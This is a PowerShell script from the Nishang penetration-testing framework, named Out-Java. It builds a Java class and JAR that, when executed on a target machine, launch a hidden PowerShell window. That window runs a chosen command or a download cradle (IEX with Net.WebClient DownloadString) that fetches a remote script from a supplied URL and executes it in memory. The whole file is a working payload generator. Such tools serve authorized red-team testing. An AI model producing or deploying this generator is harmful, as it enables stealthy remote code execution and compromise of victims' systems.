
function Out-Java
{

<#
.SYNOPSIS
Nishang script which could be used for generating Java source, class and JAR files. These could be used to 
execute commands and powershell scripts on a target machine.

.DESCRIPTION
The script generates four files. A .java file which contains the source, a .class file which is the compiled Java class, a manifest.txt
file and a JAR executable.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER $PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER $Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER $JDKPath
Patj to the JDK to compile the .Java code.

.PARAMETER $OutputPath
Path to the directory where the files would be saved. Default is the current directory.

..EXAMPLE
PS > Out-Java -Payload "Get-Process" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Above command would execute Get-Process on the target machine when the JAR or Class file is executed.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/Get-Information.ps1 -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to generate files which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to pass an argument to the powershell script/module.
.LINK
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $JDKPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath=".\"
    )


    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }    
    $JavaClass = @"
    import java.io.*;
    class JavaPS {
    public static void main(String[] args)throws IOException
    {
            Runtime runtime = Runtime.getRuntime();
            //http://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
            String arch = System.getenv("PROCESSOR_ARCHITECTURE");
            String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
            String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
            String cmd = "powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
            //Remove the below if condition to use 64 bit powershell on 64 bit machines.
            if (realArch == "64")
            {
                cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
            }
            Process proc = runtime.exec(cmd);
        }
    }
"@
    #Compile thr Java file
    $JavaFile = "$OutputPath\JavaPS.java"
    Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile
    $JavacPath = "$JDKPath" + "\bin\javac.exe"
    & "$JavacPath" "$JavaFile"

    #Create a manifest for JAR
    $Manifest = "Main-Class: JavaPS"
    $ManifestFile = "$OutputPath\manifest.txt"
    Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

    #Create JAR file
    $Jarpath = "$JDKPath" + "\bin\jar.exe"
    & "$JarPath" "-cvfm" "$OutputPath\JavaPS.jar" "$ManifestFile" "$OutputPath\JavaPS.class"

    Start-Sleep -Seconds 3

    [byte[]] $FileContent = Get-Content -Encoding Byte "$OutputPath\JavaPS.jar"
    [System.IO.File]::WriteAllLines("$pwd\encodedjar.txt", $FileContent)

    #Cleanup
    Remove-Item "$OutputPath\JavaPS.java"
    Remove-Item "$OutputPath\JavaPS.class"
    Remove-Item "$OutputPath\manifest.txt"
}